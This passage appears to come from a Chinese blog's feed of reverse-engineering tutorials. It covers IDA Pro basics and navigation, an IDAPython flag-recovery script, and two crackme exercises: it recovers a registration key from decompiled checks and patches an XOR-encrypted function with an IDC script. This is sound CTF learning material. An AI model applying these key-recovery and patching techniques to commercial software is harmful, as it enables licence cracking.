class="string">&#x27;&#x27;</span></span><br><span class="line">roots = <span class="number">0x00000028F900</span>;</span><br><span class="line"><span class="comment">#--------------常量的定义---------------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x3b</span>) :<span class="comment">#进行59次循环</span></span><br><span class="line">    node = get_qword(roots)</span><br><span class="line">    c=<span class="number">0x20</span><span class="comment">#c=32</span></span><br><span class="line">    <span class="keyword">while</span> c &lt;= <span class="number">0x7f</span>:<span class="comment">#32~127个ascii码，可见字符，一个一个比对。</span></span><br><span class="line">        <span class="keyword">if</span> traverse_find(node,c) == <span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        c+=<span class="number">1</span></span><br><span class="line">    roots += <span class="number">8</span></span><br><span class="line"><span class="comment">#--------------------进行遍历的函数------------------------------------   </span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，我用的IDA用的是这个python3.8.10的版本的。所以需要用的是python3 的语法，也就是这个print 函数的写法不一样。</p><p>如果是python 2 就直接 print flag </p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515233442128.png" alt="image-20230515233442128" style="zoom:50%;" /><p>最后我知道了几个WP</p><p><a href="https://anee.me/rabbithole-csaw-ctf-2017-finals-f7d70f3726f3">https://anee.me/rabbithole-csaw-ctf-2017-finals-f7d70f3726f3</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA Pro逆向训练（16）</title>
      <link href="/2023/05/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-16-IDA-Pro%E9%80%86%E5%90%91%E8%AE%AD%E7%BB%83/"/>
      <url>/2023/05/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-16-IDA-Pro%E9%80%86%E5%90%91%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-Pro之xrefs的巧妙运用"><a href="#IDA-Pro之xrefs的巧妙运用" class="headerlink" title="IDA Pro之xrefs的巧妙运用"></a>IDA Pro之xrefs的巧妙运用</h1><h2 id="数据交叉引用"><a href="#数据交叉引用" class="headerlink" title="数据交叉引用"></a>数据交叉引用</h2><p>首先我们要知道的xrefs其实的就是交叉引用</p><p>也即是CTRL+X就可以了</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514142655787.png" alt="image-20230514142655787"></p><p>它会列出一些信息，如上。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514142804678.png" alt="image-20230514142804678"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>视图——流程图</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514143025158.png" alt="image-20230514143025158"></p><p>打开</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514143046828.png" alt="image-20230514143046828" style="zoom: 67%;" /><p>就是一个类似于这样的图</p><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>IDA提供了一项分析函数间依存关系（交叉参考）的功能。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514143334926.png" alt="image-20230514143334926" style="zoom:50%;" /><p>可以看到上面图中，根据函数地址的属性，被区分为不同的颜色（如程序入口点，外部函数，库函数……），颜色规则与反汇编窗口中的分析结果有关。</p><h1 id="IDA-Pro-逆向训练"><a href="#IDA-Pro-逆向训练" class="headerlink" title="IDA Pro 逆向训练"></a>IDA Pro 逆向训练</h1><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514144723769.png" alt="image-20230514144723769" style="zoom:50%;" /><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>首先打开</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514143822224.png" alt="image-20230514143822224" style="zoom: 67%;" /><p>这个软件说：注册失败.</p><p>现在就是要把这个软件注册成功。</p><p>先查看发现是Win32 然后用IDA打开</p><p>然后上面这个窗口的地方有：Registeration。</p><p>所以我们就去找含有这个字符串的地方</p><p>用之前学的搜索的功能对它进行搜索。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514144056616.png" alt="image-20230514144056616"></p><p>点过去，看一下伪代码。【F5或者TAB】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eax</span></span><br><span class="line">  HICON IconW; <span class="comment">// eax</span></span><br><span class="line">  HMODULE v7; <span class="comment">// eax</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// eax</span></span><br><span class="line">  HCURSOR CursorW; <span class="comment">// [esp-4h] [ebp-34Ch]</span></span><br><span class="line">  CHAR String[<span class="number">256</span>]; <span class="comment">// [esp+8h] [ebp-340h] BYREF</span></span><br><span class="line">  CHAR v11[<span class="number">256</span>]; <span class="comment">// [esp+108h] [ebp-240h] BYREF</span></span><br><span class="line">  CHAR Text[<span class="number">256</span>]; <span class="comment">// [esp+208h] [ebp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Source[<span class="number">36</span>]; <span class="comment">// [esp+308h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">24</span>]; <span class="comment">// [esp+32Ch] [ebp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    EndDialog(hDlg, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">    IconW = LoadIconW(ModuleHandleW, (LPCWSTR)<span class="number">0x67</span>);</span><br><span class="line">    SetClassLongA(hDlg, <span class="number">-14</span>, (LONG)IconW);</span><br><span class="line">    v7 = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">    CursorW = LoadCursorW(v7, (LPCWSTR)<span class="number">0x66</span>);</span><br><span class="line">    DlgItem = GetDlgItem(hDlg, <span class="number">1</span>);</span><br><span class="line">    SetClassLongA(DlgItem, <span class="number">-12</span>, (LONG)CursorW);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> || (<span class="type">unsigned</span> __int16)a3 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(String, (<span class="type">unsigned</span> __int16)a3 - <span class="number">1</span>, <span class="keyword">sizeof</span>(String));</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  <span class="built_in">memset</span>(Text, <span class="number">0</span>, <span class="keyword">sizeof</span>(Text));</span><br><span class="line">  GetDlgItemTextA(hDlg, <span class="number">1001</span>, String, <span class="number">256</span>);</span><br><span class="line">  GetDlgItemTextA(hDlg, <span class="number">1002</span>, v11, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(String, <span class="string">&quot;@&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(String, <span class="string">&quot;.&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(String, <span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] &amp;&amp; <span class="built_in">strstr</span>(String, <span class="string">&quot;@&quot;</span>)[<span class="number">1</span>] != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(v14, <span class="string">&quot;Registration failure.&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(Source, <span class="string">&quot;Registration Success!\nYour flag is:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) == <span class="number">16</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">15</span>] == <span class="number">88</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">1</span>] == <span class="number">90</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">14</span>] == <span class="number">65</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">2</span>] == <span class="number">57</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">13</span>] == <span class="number">98</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">3</span>] == <span class="number">100</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">12</span>] == <span class="number">55</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">4</span>] == <span class="number">109</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">11</span>] == <span class="number">71</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">5</span>] == <span class="number">113</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">10</span>] == <span class="number">57</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">6</span>] == <span class="number">52</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">9</span>] == <span class="number">103</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">7</span>] == <span class="number">99</span></span><br><span class="line">      &amp;&amp; v11[<span class="number">8</span>] == <span class="number">56</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      strcpy_s(Text, <span class="number">0x100</span>u, Source);</span><br><span class="line">      strcat_s(Text, <span class="number">0x100</span>u, v11);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      strcpy_s(Text, <span class="number">0x100</span>u, v14);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    strcpy_s(Text, <span class="number">0x100</span>u, <span class="string">&quot;Your E-mail address in not valid.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(hDlg, Text, <span class="string">&quot;Registeration&quot;</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的，大概率是在定义东西吧。也不是很需要看懂。</p><p>然后看这个if语句。这个strcpy 就是字符串拷贝函数。把后面的copy到前面去。</p><p>最后调用了一个MessageBoxA的函数</p><p>通过快捷键把数字【ascii码】先转化为字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) == <span class="number">16</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">15</span>] == <span class="string">&#x27;X&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">1</span>] == <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">14</span>] == <span class="string">&#x27;A&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">2</span>] == <span class="string">&#x27;9&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">13</span>] == <span class="string">&#x27;b&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">3</span>] == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">12</span>] == <span class="string">&#x27;7&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">4</span>] == <span class="string">&#x27;m&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">11</span>] == <span class="string">&#x27;G&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">5</span>] == <span class="string">&#x27;q&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">10</span>] == <span class="string">&#x27;9&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">6</span>] == <span class="string">&#x27;4&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">9</span>] == <span class="string">&#x27;g&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">7</span>] == <span class="string">&#x27;c&#x27;</span></span><br><span class="line">  &amp;&amp; v11[<span class="number">8</span>] == <span class="string">&#x27;8&#x27;</span> )</span><br></pre></td></tr></table></figure><p>最后组成：CZ9dmq4c8g9G7bAX</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514150215382.png" alt="image-20230514150215382" style="zoom:50%;" /><p>成功的通过第一关……</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>首先用用die查看一下</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514152810417.png" alt="image-20230514152810417" style="zoom:50%;" /><p>发现是一个ELF也就是linux下的一个文件。</p><p>然后我们用kali 来运行一下这个文件</p><p>首先看到的是：我们的权限不够</p><p>我用的都是root了..我也不知道为什么权限不够。。。我们百度一下</p><p>然后用chmod 这个命令来提高权限【也许是这个意思】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514152919392.png" alt="image-20230514152919392"></p><p>然后发现：有Please input flag:</p><p>随便输入一下，发现是Wrong。</p><p>这里我们用IDA打开看一看咯【由于之前看到的是一个64位的】所以我们用64位的打开。</p><p>还是一样：搜索一下这个flag的位置</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514153855603.png" alt="image-20230514153855603"></p><p>点击下面这个Please input flag</p><p>过去过后稍微看一下流程图，然后就可以来看看伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">181</span>; ++i )</span><br><span class="line">    judge[i] ^= <span class="number">0xC</span>u;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, s);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">14</span> &amp;&amp; (*(<span class="type">unsigned</span> <span class="type">int</span> (__fastcall **)(<span class="type">char</span> *))judge)(s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个要put Right 要满足上面这个条件</p><p>v5的的值要等于14 ； v5=strlen(s) 所以这个s 的长度得是14</p><p>点击这个judge函数，点过去看看：</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514162926543.png" alt="image-20230514162926543" style="zoom: 33%;" /><p>这里这个judge db 59h 和下面 超过了59h的单位，让我总觉得有问题。但是我又说不出来问题在哪里。…</p><p>由于之前的judge 函数是异或了181次后的，我们现在要把他还原回去，那也就是异或181次回去</p><p>也就是说：下面的东西 db 44h ; D 以后的东西，被加密了呗。</p><p>解密idc脚本 修复judge函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0xb5</span>;i++)</span><br><span class="line">&#123;PatchByte(<span class="number">0x600b00</span>+i,Byte(<span class="number">0x600b00</span>+i) ^ <span class="number">0xc</span>);&#125;</span><br><span class="line"></span><br><span class="line">patch 修补</span><br><span class="line">patchbyte  补丁字节</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514165949130.png" alt="image-20230514165949130" style="zoom: 33%;" /><p>由于IDA在开始的时候会自己分析一手：这个分析对我们来说是错误的。所以就需要把这个judge删掉。也就是右键然后undefine</p><p>也可以用快捷键“u”。删去后，让他重新分析；按下“p”键。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514170436170.png" alt="image-20230514170436170" style="zoom: 33%;" /><p>ok 这样就是变回来后的，现在我们tab一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">judge</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">5</span>]; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">9</span>]; <span class="comment">// [rsp+Dh] [rbp-1Bh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(v1, <span class="string">&quot;fmcd&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  v1[<span class="number">4</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v2, <span class="string">&quot;k7d;V`;np&quot;</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span> &amp;&amp; *(_BYTE *)(i + a1) == v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  __asm &#123; iret &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">judge</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">28</span>]; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(v1, <span class="string">&quot;fmcd\x7Fk7d;V`;np&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span> &amp;&amp; *(_BYTE *)(i + a1) == v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  __asm &#123; iret &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到一个这样的伪代码</p><p>我也不知道为什么，2次弄出来的不一样….</p><p>但是看着一其实应该差不多。</p><p>  qmemcpy()函数：C 库函数 void *memcpy(void *str1, const void *str2, size_t n) 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>。</p><p>fmcd\x7Fk7d;V`;np 这个里面的 \x7f 是7f所表示的16进制 对应10进制是127 对应的ascii码是：DEL 删除键 。无法对应成字符，所以就成这样了。</p><p>然后再异或回去就能得到flag..</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514171444446.png" alt="image-20230514171444446"></p><hr><p>这个题；这个伪代码看得我蒙蒙的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>静态分析工具——IDA Pro介绍和功能介绍（15）</title>
      <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-15-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-IDA-Pro%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-15-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-IDA-Pro%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>工欲善其事必先利其器~</p><h1 id="IDA-Pro-介绍"><a href="#IDA-Pro-介绍" class="headerlink" title="IDA Pro 介绍"></a>IDA Pro 介绍</h1><p>这有啥介绍的呢？</p><p>总的来说，就是很强大。</p><p>这里来说说打开和退出吧。</p><p>主要是这个有汉化版本，就很容易理解啦。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514000955546.png" alt="image-20230514000955546" style="zoom:50%;" /><h1 id="IDA-Pro之主要窗口"><a href="#IDA-Pro之主要窗口" class="headerlink" title="IDA Pro之主要窗口"></a>IDA Pro之主要窗口</h1><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514122702965.png" alt="image-20230514122702965" style="zoom: 50%;" /><p>1.上边有一个工具栏</p><p>通过右键可以开启或者关闭某些功能</p><p>2.导航带 (Overview navigator)</p><p>以线性方式显示了当前加载文件的地址信息。</p><p>3.标签栏（Tabs）</p><p>提供了当前已经打开子窗口标签</p><p>IDA View-A（反汇编窗口一如果打开多个反汇编窗口会以此为 IDA View-B, IDA View-C.)、 Hex View一A（十六进制窗口一同IDA view 窗口一样打开多个窗口会以此按字母序号命名）、Structures（结构体窗口）、Enums（枚举窗口）、Imports（输人表窗口），Exports（输出表窗口)。如果需要其他参考信息可以通过荣单 “View 一 Open Subviews”功能打开新的参考窗口。</p><p>4.消息窗口（又叫做日志 窗口 Message Window)</p><p>这个窗口如果是关着的。可以用alt+0。来开启</p><h1 id="IDA-Pro之导航功能"><a href="#IDA-Pro之导航功能" class="headerlink" title="IDA Pro之导航功能"></a>IDA Pro之导航功能</h1><h2 id="导航目标"><a href="#导航目标" class="headerlink" title="导航目标"></a><strong>导航目标</strong></h2><p>在分析阶段，IDA 会通过检查二进制文件的符号表生成符号名称，或根据二进制文件引用位置的方式自动生成一个名称</p><p>反汇编窗口中显示的任何名称都是导航目标</p><p>双击任何一个符号，IDA 将跳转到相应的位置</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514132758155.png" alt="image-20230514132758155"></p><p>这些是已经命名的导航目标</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514132904590.png" alt="image-20230514132904590"></p><p>上面划红线的是交叉引用，也是导航目标交叉引用通常被格式化成一个名称和一个十六进制偏双击交叉引用文本，IDA 将跳转到引用位置</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514133009840.png" alt="image-20230514133009840"></p><p>双击标有 1 的值，反汇编窗口将跳转到相应的位置，因为它们都属于给定二进制文件中的合法虚拟地址</p><p>双击标有 2 的值则不会有任何效果</p><h2 id="跳转地址"><a href="#跳转地址" class="headerlink" title="跳转地址"></a><strong>跳转地址</strong></h2><p>在左边，点击想去的地方。或者用IDA的Search菜单搜索功能。</p><p>跳转到一个已知的反汇编位置，可以用 Jump 菜单下的 Jump to Address 选项，快捷键为 G</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514133152866.png" alt="image-20230514133152866"></p><h2 id="导航历史记录"><a href="#导航历史记录" class="headerlink" title="导航历史记录"></a><strong>导航历史记录</strong></h2><p>IDA 具有前进和后退导航功能，基于浏览反汇编窗口的顺序</p><p>Jump -&gt; Jump to Previous Position 命令使反汇编窗口跳转到当前位置的前一个位置，快捷键为 Esc</p><p>Jump -&gt; Jump to Next Position 命令将反汇编窗口移动到列表中的下一个位置，快捷键为 Ctrl+Enter</p><p>工具栏上有前进和后退按钮，每个按钮旁边还有一个历史记录下拉列表</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230514133402414.png" alt="image-20230514133402414"></p><p>其实这些东西，还得在以后的练习中熟能生巧。现在只是了解一下，知道有这么一回事就好了。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>查壳工具的使用（14）</title>
      <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-14-%E6%9F%A5%E5%A3%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-14-%E6%9F%A5%E5%A3%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
